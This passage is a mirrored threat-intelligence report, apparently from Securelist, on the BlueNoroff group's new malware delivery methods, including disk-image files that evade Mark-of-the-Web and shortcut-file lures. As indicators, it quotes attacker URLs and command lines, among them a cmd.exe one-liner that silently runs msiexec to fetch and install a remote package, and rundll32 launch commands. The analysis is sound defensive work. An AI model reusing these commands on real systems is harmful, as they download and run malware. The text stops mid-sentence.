---
title: BlueNoroff introduces new methods bypassing MoTW
url: https://buaq.net/go-141556.html
source: unSafe.sh - 不安全
date: 2022-12-28
fetch_date: 2025-10-04T02:34:54.210919
---

# BlueNoroff introduces new methods bypassing MoTW

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/59384ca8e76a157b1df7ee2aca4c5bab.jpg)

BlueNoroff introduces new methods bypassing MoTW

BlueNoroff group is a financially motivated threat actor eager to profit from its cybe
*2022-12-27 16:0:26
Author: [securelist.com(查看原文)](/jump-141556.htm)
阅读量:39
收藏*

---

BlueNoroff group is a financially motivated threat actor eager to profit from its cyberattack capabilities. We have [published](https://securelist.com/the-bluenoroff-cryptocurrency-hunt-is-still-on/105488/) technical details of how this notorious group steals cryptocurrency before. We continue to track the group’s activities and this October we observed the adoption of new malware strains in its arsenal. The group usually takes advantage of Word documents and uses shortcut files for the initial intrusion. However, it has recently started to adopt new methods of malware delivery.

The first new method the group adopted is aimed at evading the Mark-of-the-Web (MOTW) flag, the security measure whereby Windows displays a warning message when the user tries to open a file downloaded from the internet. To do this, optical disk image (.iso extension) and virtual hard disk (.vhd extension) file formats were used. This is a common tactic used nowadays to evade MOTW, and BlueNoroff has also adopted it.

In addition, the group tested different file types to refine malware delivery methods. We observed a new Visual Basic Script, a previously unseen Windows Batch file, and a Windows executable. It seems the actors behind BlueNoroff are expanding or experimenting with new file types to convey their malware efficiently.

After researching the infrastructure that was utilized, we discovered more than 70 domains used by this group, meaning they were very active until recently. Also, they created numerous fake domains that look like venture capital and bank domains. Most of the domains imitate Japanese venture capital companies, indicating that the group has an extensive interest in Japanese financial entities.

## Executive summary

* BlueNoroff group introduced new file types to evade Mark-of-the-Web (MOTW) security measures;
* BleuNoroff group expanded file types and tweaked infection methods;
* BlueNoroff created numerous fake domains impersonating venture capital companies and banks.

## Background

At the end of September 2022, we observed new BlueNoroff malware in our telemetry. After a careful investigation, we confirmed that the actor had adopted new techniques to convey the final payload. The actor took advantage of several scripts, including Visual Basic Script and Windows Batch script. They also started using disk image file formats, .iso and .vhd, to deliver their malware. For intermediate infection, the actor introduced a downloader to fetch and spawn the next stage payload. Although the initial intrusion methods were very different in this campaign, the final payload that we had analyzed previously was used without significant changes.

[![Novel infection chain](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/12/20135813/BlueNoroff_used_a_tactic_called_Mark-of-the-Web_01-1024x595.png)](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/12/20135813/BlueNoroff_used_a_tactic_called_Mark-of-the-Web_01.png)

***Novel infection chain***

## Long-lasting initial infection

Based on our telemetry, we observed that one victim in the UAE was attacked using a malicious Word document. The victim received a document file named “Shamjit Client Details Form.doc” on September 2, 2022. Unfortunately, we couldn’t acquire the document, but it was executed from the following path:

Judging from the file path, we can assume that the victim was an employee in the sales department responsible for signing contracts.

Upon launch, the malicious document connects to the remote server and downloads the payload. In this particular case, the executable *ieinstal.exe* was used to bypass UAC.

* Remote URL: https://bankofamerica.us[.]org/lsizTZCslJm/W+Ltv\_Pa/qUi+KSaD/\_rzNkkGuW6/cQHgsE=
* Created payload path: %Profile%\cr.dat
* Spawned command: cmd.exe %Profile%\cr.dat 5pKwgIV5otiKb6JrNddaVJOaLjMkj4zED238vIU=

After initial infection, we observed several keyboard hands-on activities by the operator. Through the implanted backdoor, they attempted to fingerprint the victim and install additional malware with high privileges. Upon infection, the operator executed several Windows commands to gather basic system information. They then returned 18 hours later to install further malware with high privileges.

[![Post-exploitation](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/12/20135958/BlueNoroff_used_a_tactic_called_Mark-of-the-Web_02-1024x268.png)](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/12/20135958/BlueNoroff_used_a_tactic_called_Mark-of-the-Web_02.png)

***Post-exploitation***

Based on our telemetry, when the malicious Word document opens it fetches the next payload from the remote server:

* Download URL: http://avid.lno-prima[.]lol/VcIf1hLJopY/shU\_pJgW2Y/KvSuUJYGoa/sX+Xk4Go/gGhI=

The fetched payload is supposed to be saved in %Profile%\update.dll. Eventually, the fetched file is spawned with the following commands:

* Command #1: rundll32.exe %Profile%\update.dll,#1 5pOygIlrsNaAYqx8JNZSTouZNjo+j5XEFHzxqIIqpQ==
* Command #2: rundll32.exe %Profile%\update.dll,#1 5oGygYVhos+IaqBlNdFaVJSfMiwhh4LCDn4=

One of the other [methods](https://securelist.com/the-bluenoroff-cryptocurrency-hunt-is-still-on/105488/) the BlueNoroff group usually uses is a ZIP archive with a shortcut file. The archive file we recently discovered contained a password-protected decoy document and a shortcut file named “*Password.txt.lnk*“. This is a classic BlueNoroff strategy to persuade the victim to execute the malicious shortcut file to acquire the decoy document’s password. The latest archive file (MD5 1e3df8ee796fc8a13731c6de1aed0818) discovered has a Japanese file name, 新しいボーナススケジュール.zip (Japanese for “New bonus schedule”), indicating they were interested in Japanese targets.

The main difference from the previous shortcut sample was that it fetched an additional script payload (Visual Basic Script or HTML Application); also, a different method of fetching and executing the next stage payload was adopted at this time. The command below was executed when the victim double-clicked on the shortcut file:

|  |  |
| --- | --- |
|  | cmd.exe /c DeviceCredentialDeployment & echo jbusguid> %APPDATA%\Pass.txt & start  %APPDATA%\Pass.txt && FOR %i IN (%systemroot%\system32\msiexec.\*) DO msiexec -c /Q /i  hxxps://www.capmarketreport[.]com/packageupd.msi?ccop=RoPbnVqYd & timeout |

To evade detection, the actor utilized Living Off the Land Binaries (LOLBins). The DeviceCredentialDeployment execution is a well-known LOLBin used to hide the command’s windows. The actor also abused the msiexe.exe file to silently launch the fetched Windows Installer file.

## Updated method #1: Tricks to evade MOTW flag

We observed that the actor examined different file types to deliver their malware. Recently, many threat actors have adopted image files to avoid MOTW (Mark-of-the-Web). In a nutshell, MOTW is a mitigation technique introduced by Microsoft. The NTFS file system marks a file downloaded from the internet, and Windows handles the file in a safe way. For example, when a Microsoft Office file is fetched from the internet, the OS opens it in Protected View, which restricts the execution of the embedded macro. In order to avoid this mitigation technique, more threat actors have started abusin...